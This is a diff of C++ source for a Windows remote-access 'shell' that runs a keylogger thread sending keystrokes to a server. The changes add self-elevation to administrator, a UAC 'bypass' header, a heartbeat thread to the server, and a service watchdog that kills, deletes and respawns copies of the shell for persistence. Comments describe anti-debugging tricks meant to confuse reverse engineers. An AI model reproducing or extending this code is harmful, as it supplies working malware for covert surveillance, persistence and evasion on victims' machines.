@@ -2,14 +2,18 @@
 #include "serviceutils.h"
 #include "utils.h"
 
+typedef __success(return >= 0) LONG NTSTATUS;
+extern "C" {
+#include "bypass.h"
+}
 #include <windows.h>
 #include <psapi.h>
 #include <shellapi.h>
 
-typedef __success(return >= 0) LONG NTSTATUS;
-
 //Thread used to check if main shell is running, and if it not start it
 void BackupThread();
+//Thread used for "service" logic
+void ServiceThread();
 //Thread used to check if backup shell is still running, and if not start it and close itself
 void CheckBackupRunningThread();
 //Straightforward ig
@@ -23,9 +27,20 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 {
 	//Alloc console for debug purposes
 	CreateDebugConsole();
-
+	//Self elevate
+	if (!Utils::IsElevated()) {
+		StartProcessAsAdmin((LPWSTR)ExePathW(), FALSE);
+		return 0;
+	}
 	//Process to terminate at start
 	std::string args(lpCmdLine);
+
+	//Check if this is the "service" branch
+	if (!strcmp(ExePathA(), ShellServicePath(SERVICE_FILE_NAME).c_str())) {
+		_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ServiceThread, NULL, NULL, NULL);
+		goto useless_backup_shell_code;
+	}
+
 	if (args.length()) {
 		Log("Given process to close in argument\n");
 		//NTSTATUS result = EnablePrivilege(L"SeDebugPrivilege");
@@ -39,11 +54,14 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 
 		HANDLE hProc = 0;
 		auto procID = Utils::getProcess(to_close.c_str(), false);
+
 		if (procID) {
-			Log("Found proc ID\n");
-			const auto hBackupShell = OpenProcess(PROCESS_TERMINATE, false, procID);
-			TerminateProcess(hBackupShell, 1);
-			CloseHandle(hBackupShell);
+			if (procID != GetCurrentProcessId()) { //Avoid shell closing itself if instructed to close another old instance
+				Log("Found proc ID\n");
+				const auto hBackupShell = OpenProcess(PROCESS_TERMINATE, false, procID);
+				TerminateProcess(hBackupShell, 1);
+				CloseHandle(hBackupShell);
+			}
 		}
 		else {
 			Log("Proc ID not found\n");
@@ -67,9 +85,10 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdL
 	//If full module path == backup module path, do useless shit in main thread
 	if (!strcmp(ExePathA(), SHELL_BACKUP_EXE)) { 
 		while (true) {
+useless_backup_shell_code:
+			Sleep(1000);
 			//Just to fuck with reverse engineers allocate some apparently useful string
 			char* uselessString = "GetNativeSystemInfo"; 
-useless_backup_shell_code:
 			//I mean, why not
 			if (!IsDebuggerPresent()) { 
 				//Get random ass handle cuz people put hooks on this shit when debugging
@@ -87,7 +106,6 @@ useless_backup_shell_code:
 				if (mbi.Protect)
 					goto useless_backup_shell_code;
 			}
-			Sleep(1000);
 		}
 	}
 
@@ -130,6 +148,7 @@ non_backup_shell_code:
 	remove(SHELL_PATH(SHELL_UPDATE_NAME));
 
 	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)Client::KeyloggerThread, NULL, NULL, NULL); //Thread to send keylogs to server
+	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)Client::HearthBeatThread, NULL, NULL, NULL); //Thread to send heartbeats to server
 
 	//Main loop
 	while (true)
@@ -315,8 +334,73 @@ void BackupThread() {
 	}
 }
 
+void ServiceThread() {
+	//Read contents of own copy from disk
+	auto cur_exe = ExePathA();
+
+	Log("Got service bytes from disk\n");
+
+	while (1) {
+		//Check if shell image on disk equals "service" one
+		if (!Utils::compareFiles(cur_exe, SHELL_EXE)) {
+			Log("Shell and service don't match, restarting shell...\n");
+			//If it doesn't, delete old shell and backup shell since an update probably occurred
+			auto shellProcID = Utils::getProcess(SHELL_NAME);
+			auto backupShellProcId = Utils::getProcess(SHELL_BACKUP_NAME);
+
+			if (backupShellProcId) {
+				Log("Closing backup shell\n");
+				const auto hBackupShell = OpenProcess(PROCESS_TERMINATE, false, backupShellProcId);
+				TerminateProcess(hBackupShell, 1);
+				CloseHandle(hBackupShell);
+			}
+			if (shellProcID) {
+				Log("Closing main shell\n");
+				const auto hMainShell = OpenProcess(PROCESS_TERMINATE, false, shellProcID);
+				TerminateProcess(hMainShell, 1);
+				CloseHandle(hMainShell);
+			}
+
+			while (!remove(SHELL_EXE)) {
+				Log("Failed to remove SHELL_EXE\n");
+				Sleep(100);
+			}
+			while (!remove(SHELL_BACKUP_EXE)) {
+				Log("Failed to remove SHELL_BACKUP_EXE\n");
+				Sleep(100);
+			}
+
+			//Recreate main shell and start it
+			while (!CopyFile(cur_exe, SHELL_EXE, FALSE)) {
+				Log("Failed to copy itself to SHELL_EXE\n");
+				Sleep(100);
+			}
+		}
+
+		//Get it again since other branch may not be called if process just has been terminated
+		auto shellProcID = Utils::getProcess(SHELL_NAME); 
+		//Start main shell if not found
+		if (!shellProcID) {
+			Log("Shell process not found, starting it...\n");
+			if(!FileExists(SHELL_EXE)) CopyFile(ExePathA(), SHELL_EXE, FALSE);
+
+			STARTUPINFO info = { sizeof(info) };
+			PROCESS_INFORMATION processInfo;
+			ZeroMemory(&info, sizeof(info));
+			ZeroMemory(&processInfo, sizeof(processInfo));
+			while (!CreateProcessA(SHELL_EXE, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
+			{
+				Sleep(100);
+			}
+			CloseHandle(processInfo.hThread);
+			CloseHandle(processInfo.hProcess);
+		}
+
+		Sleep(5000);
+	}
+}
+
 void RestartBackupShellAndExit() {
-	Log("Main shell has been closed\n");
 	//If not running first attempt to copy the image to disk, then run it
 	CopyFile(ExePathA(), SHELL_BACKUP_EXE, FALSE);
 	Log("Created backup shell on disk\n");
@@ -357,6 +441,7 @@ void CheckBackupRunningThread() {
 		}
 		//If exit code is STILL_ACTIVE the process hasn't been stopped yet
 		if (exitCode != STILL_ACTIVE) { 
+			Log("Backup shell has been closed\n");
 			RestartBackupShellAndExit();
 		}
 		if (FileExists(SHELL_PATH(SHELL_UPDATE_NAME))) {
